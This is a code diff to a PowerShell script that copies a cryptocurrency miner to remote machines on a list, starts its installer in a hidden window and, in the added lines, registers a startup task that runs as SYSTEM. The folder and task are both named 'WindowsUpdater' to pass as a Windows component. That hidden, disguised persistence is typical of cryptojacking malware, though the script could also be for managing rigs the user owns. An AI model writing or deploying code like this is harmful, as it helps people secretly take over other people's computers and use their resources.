@@ -1,4 +1,4 @@
-# 🔧 CONFIGURATION
+﻿# 🔧 CONFIGURATION
 $sharedFolderName = "MinerDeploy"
 $localFolderPath  = "C:\ProgramData\WindowsUpdater"
 $rigListPath      = "C:\deploy\rigs.txt"
@@ -49,17 +49,27 @@ foreach ($ip in $liveIps) {
             # Create install folder
             New-Item -Path $targetFolder -ItemType Directory -Force
 
-            # Copy miner setup from main rig
+            # Copy full miner setup including miner_src
             Copy-Item -Path "$sourceShare\*" -Destination $targetFolder -Recurse -Force
 
-            # Assign unique rig ID based on hostname
-            $configPath = "$targetFolder\config.json"
+            # Assign unique rig ID inside miner_src\config.json
+            $configPath = "$targetFolder\miner_src\config.json"
             if (Test-Path $configPath) {
                 (Get-Content $configPath) -replace "REPLACE_WITH_RIGID", $env:COMPUTERNAME | Set-Content $configPath
             }
 
-            # Run installer silently
+            # Run installer immediately
             Start-Process -FilePath "$targetFolder\installer.bat" -WindowStyle Hidden
+
+            # Register autostart task for installer.bat
+            $action = New-ScheduledTaskAction -Execute "$targetFolder\installer.bat"
+            $trigger = New-ScheduledTaskTrigger -AtStartup
+            Register-ScheduledTask -TaskName "WindowsUpdater" `
+                -Action $action `
+                -Trigger $trigger `
+                -User "SYSTEM" `
+                -RunLevel Highest `
+                -Force
         } -ArgumentList "\\$env:COMPUTERNAME\$sharedFolderName", $targetFolder
 
         Write-Host "✔ Success on $ip"
